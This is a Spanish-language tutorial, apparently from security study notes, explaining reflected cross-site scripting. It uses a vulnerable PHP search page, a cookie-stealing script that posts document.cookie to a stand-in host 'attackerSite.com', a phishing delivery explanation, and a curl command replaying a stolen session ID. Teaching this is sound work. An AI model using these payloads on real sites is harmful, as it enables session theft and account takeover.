[Volver al inicio](../Readme.md)
# XSS (Cross-Site Scripting)
## Introducción.
El ataque XSS consiste en inyectar codigo Javascript malicioso en un sitio web vulnerable, de forma que al ser cargado por un usuario víctima, se ejecute en su navegador dicho código malicioso, con el objetivo de extraer información de la víctima, como por ejemplo, la cookie de sessión. Existen básicamente tres tipos de ataques (sin tener en cuenta los ataques XSS ciegos):
## Tipos de XSS
### XSS Reflejados
Este tipo de ataque se aprovecha de una deficiente o nula sanitización de los parametros de entrada, procedentes por ejemplo, de un formulario HTML del sitio web. 

Imaginemos un sitio web que tiene el siguiente código HTML para buscar un producto:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Web XSS</title>
</head>
<body>
    <h2>Busca un producto</h2>
    <form action="xss1.php" method="GET">
        <label for="id_producto">Producto (ID):</label>
        <input type="text" id="id_producto" name="id_producto" required>
        <button type="submit">Enviar</button>
    </form>
</body>
</html>
 ```

 Y el código PHP del lado del servidor que recibe los datos del usuario:
 ```php
 <!DOCTYPE html>
<html>
<head>
    <title>Lector XSS</title>
</head>
<body>

<?php
// Crear conexión
$conn = new mysqli($servername, $username, $password, $database);

// Verificar la conexión
if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

// Verificar si se proporcionó el parámetro "id_producto" en la URL
if(isset($_GET['id_producto'])) {
    
    /* Aquí realizaría la búsqueda en la base de datos*/

    if ($result->num_rows > 0) {
        // El producto existe en la base de datos
        echo "Realiza alguna acción";
    } else {
        // El producto NO existe en la base de datos
        echo "El producto con el ID " + $_GET['id_producto'] + " no existe en la base de datos.";
    }
} else {
    // Si el parámetro "id_producto" no se proporcionó en la URL
    echo "Debe proporcionar un identificador de producto.";
}

// Cerrar conexión
$conn->close();
?>

</body>
</html>
```

 En el código PHP (que no está sanitizado), observamos que, en caso de que no exista el producto, muestra un mensaje al cliente en el que añade el id del producto buscado. En este caso, si un atacante integra un script malicioso en el campo de búsqueda del producto, dicho script se verá **REFLEJADO** en la respuesta HTML que se envía al cliente y será ejecutado en su navegador.

 Imagina ahora que el script que envía el atacante es el siguiente:

 ```html
 <script>
    var cookies = document.cookie;

    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://attackerSite.com/store_cookies.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('cookies=' + encodeURIComponent(cookies));
</script>
 ```
El atacante estará enviando la cookie del usuario de ese sitio web a un sitio de su propiedad, con la intención de almacenar cada cookie de sesión.

!!! ACLARACIÓN:
Si un atacante realiza estas pruebas sobre un sitio web con una vulnerabilidad XSS reflejada, hay que entender que la respuesta al ataque la recibe él mismo, es decir, enviaría su propia cokie. Para poder conseguir la cookie de la víctima, el atacante guarda la respuesta del servidor **que contiene el payload (script XSS) inyectado** y mediante ataques dirigidos de PHISHING, enviará enlaces a las víctimas potenciales para que ejecuten la respuesta envenenada del servidor, con lo que conseguirá que la víctima envíe su propia cookie al sitio del atacante.

Posteriormente, el atacante, previo estudio del funcionamiento del sitio web que pretende atacar y conociendo las peticiones que utiliza el sitio web, puede intentar acciones maliciosas utilizando las cookies robadas:

```
curl -X GET \
  -H "Cookie: PHPSESSID=SESSION_ID_ROBADA" \
  https://example.com/protected-page.php

```

### XSS almacenados
### DOM XSS
## Bibliografía